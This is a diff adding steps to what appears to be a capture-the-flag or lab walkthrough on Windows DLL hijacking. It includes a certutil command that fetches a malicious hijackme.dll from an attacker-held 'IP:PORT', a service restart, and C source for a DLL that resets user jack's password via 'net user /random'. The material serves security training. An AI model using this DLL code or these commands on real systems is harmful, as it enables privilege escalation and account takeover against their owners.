@@ -364,10 +364,51 @@ You can easily install the Mingw compiler using the `apt install gcc-mingw-w64-x
 
 We have seen earlier that the application we target searches for a DLL named `hijackme.dll`. This is what our malicious DLL should be named.
 
+![image](https://user-images.githubusercontent.com/69868171/154280334-cf14e7e2-06ed-4139-9452-c3e65a53dead.png)
+
 
 You can copy the C code above given for the DLL file to the AttackBox or the operating system you are using and proceed with compiling.
 
 
-Once compiled, we will need to move the hijackme.dll file to the Temp folder in our target system. You can use the following PowerShell command to download the .dll file to the target system: `certutil --urlcache -split -f "IP:PORT/hijackme.dll" hijackme.dll`
+Once compiled, we will need to move the hijackme.dll file to the Temp folder in our target system. You can use the following PowerShell command to download the .dll file to the target system: `certutil -urlcache -split -f "IP:PORT/hijackme.dll" hijackme.dll`
+
+
+![image](https://user-images.githubusercontent.com/69868171/154279702-d554255b-2568-414f-830c-82d2b8b12c82.png)
+
+
+We will have to stop and start the dllsvc service again using the command below:
+
+```
+sc stop dllsvc & sc start dllsvc
+```
+
+![image](https://user-images.githubusercontent.com/69868171/154279895-83725379-76cb-426d-b7db-1dc9d2422d4f.png)
+
+DLL Hijacking done.
+
+###  Skeleton Code To Chnage User Password
+
+```
+           
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k net user jack /random > C:\\Temp\\dll.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+```
+
+File transfer to the directory that is missing the `hijackme.dll` now let stop and start the `dllsvc` on our command prompt.
+
+![image](https://user-images.githubusercontent.com/69868171/154288313-db06ef5f-d356-41fc-9877-16e10232a4ac.png)
+
+Now let confirm it.
+
+![image](https://user-images.githubusercontent.com/69868171/154288471-b48d131b-2777-4fa0-8d93-59c85a418bee.png)
+
+DLL hijack and password for user `jack` was change successfully.
 
 
